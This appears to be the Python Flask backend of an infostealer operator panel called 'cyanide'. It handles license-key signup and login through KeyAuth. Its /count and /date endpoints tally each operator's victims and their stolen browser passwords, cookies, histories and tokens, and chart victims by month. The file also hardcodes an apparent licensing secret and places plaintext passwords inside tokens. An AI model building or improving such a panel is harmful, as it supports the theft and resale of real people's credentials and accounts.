import jwt
import base64
import rsa
import json
import os
import datetime
import string
import random

from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS, cross_origin

from lib import keyauth

Defaultsettings = {
    "countAnimation": True
}

dbfile = os.path.join(os.path.dirname(__file__), "db.json")
dumpfile = os.path.join(os.path.dirname(__file__), "dumps.json")

keyAuth = keyauth.Keyauth("cyanide", "1ELEEIPBpf")
keyAuth.init()

with open(os.path.join(os.path.dirname(__file__), "key.pem"), "r") as f:
    private = rsa.PrivateKey.load_pkcs1(f.read().encode())

with open(os.path.join(os.path.dirname(__file__), "key.pub"), "r") as f:
    public = rsa.PublicKey.load_pkcs1(f.read().encode())

app = Flask(__name__)


def get_random_string(length: int):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def generateJwt(random: str, username: str, password: str, dt: str):
    payload = {
        "username": username,
        "password": password,
        "datetime": str(dt)
    }
    token = jwt.encode(payload, base64.standard_b64encode(
        random.encode()).decode(), "HS512")
    tokenRSA = rsa.encrypt(token.encode(), public)

    return base64.b32encode(tokenRSA).decode()


def decodeJwt(jwtoken: str, rstring):
    plaintoken = base64.b32decode(jwtoken.encode())
    token = rsa.decrypt(plaintoken, private).decode()
    return jwt.decode(token, base64.standard_b64encode(rstring.encode()), "HS512")


def getip(username: str):
    return json.load(open(dbfile, "r"))[username]["ip"]


CORS(app, resources={
     r"/*": {"origins": ["http://localhost:8080", "http://127.0.0.1:5500"]}})


@cross_origin(origin='localhost', headers=['Content- Type', 'Authorization'])

@app.route("/endpoint", methods=["GET"])
def apiconn():
    return "ping"

@app.route('/login', methods=['POST'])
def login():
    db = json.load(open(dbfile, "r"))

    data = request.json
    username = data['username']
    password = data['password']

    r = keyAuth.login(username, password, None)

    if not r["success"]:
        return jsonify({'error': r["message"]}), 401
    else:
        rstring = get_random_string(20)
        jwtoken = generateJwt(rstring, username, password,
                              datetime.datetime.now())
        db[username]["jwt"] = jwtoken
        db[username]["ip"] = request.remote_addr
        db[username]["n"] = rstring
        open(dbfile, "w").write(json.dumps(db, indent=3))
        return {"token": jwtoken, "n": rstring}


@app.route('/token-login', methods=['POST'])
def tokenLogin():
    data = request.json
    token = data["token"]
    rstring = data["n"]

    tokenData = decodeJwt(token, rstring)
    username = tokenData["username"]
    password = tokenData["password"]

    if getip(username) != request.remote_addr:
        return jsonify({'success': False, "message": "Invalid IP"}), 401

    r = keyAuth.login(username, password, None)
    if not r["success"]:
        return jsonify({'error': r["message"], "success": False}), 401
    else:
        return {"success": True, "username": username}


@app.route('/signup', methods=['POST'])
def signup():
    db = json.load(open(dbfile, "r"))

    data = request.json
    key = data["key"]
    username = data["username"]
    password = data["password"]

    rstring = get_random_string(20)
    token = generateJwt(rstring, username, password, datetime.datetime.now())

    r = keyAuth.register(username, password, key, None)
    if r["success"]:
        db[username] = {
            "jwt": token,
            "ip": request.remote_addr,
            "n": rstring,
            "dumps": {
            },
            "settings": Defaultsettings
        }
        open(dbfile, "w").write(json.dumps(db, indent=3))

        return {"token": token, "n": rstring}
    else:
        return jsonify({'error': r["message"]}), 401


@app.route('/count', methods=['POST'])
def count():
    data = request.json
    token = data["token"]
    rstring = data["n"]

    dumps = json.load(open(dumpfile, "r"))
    tokenData = decodeJwt(token, rstring)
    username = tokenData["username"]

    victims = dumps[username]["dumps"]

    count, password, cookies, histories = 0, 0, 0, 0

    if not len(victims) <= 0:
        for victim in victims:
            tokens = victims[victim]["tokens"]
            for browser in victims[victim]["data"]:
                for datatype in victims[victim]["data"][browser]:
                    if datatype.lower() == "history":
                        for history in victims[victim]["data"][browser][datatype]:
                            for history_cred in victims[victim]["data"][browser][datatype][history]:
                                histories += 1
                                count += 1
                    for cookiesValue in victims[victim]["data"][browser]["Cookies"]:
                        cookies += 1

                    for passwords in victims[victim]["data"][browser]["Passwords"]:
                        password += 1

                    for cred in victims[victim]["data"][browser][datatype]:
                        count += 1
    return {"creds": count, "victims": len(victims), "tokens": len(tokens), "summary": {"passwords": password, "cookies": cookies, "histories": histories}}

@app.route("/date", methods=["POST"])
def getDate():
    dates = []

    data = request.json
    token = data["token"]
    rstring = data["n"]

    db = json.load(open(dumpfile, "r"))
    tokenData = decodeJwt(token, rstring)
    username = tokenData["username"]

    victims = db[username]["dumps"]
    for victim in victims:
        dates.append(victims[victim]["date"])

    counts = {m: 0 for m in range(1, 13)}

    for date_str in dates:
        date_obj = datetime.strptime(date_str, "%d-%m-%Y")
        month = date_obj.month
        counts[month] += 1

    result = [counts.get(i, 0) for i in range(1, 13)]
   
    return {"dateCount": result}

if __name__ == '__main__':
    app.run(port=8080)
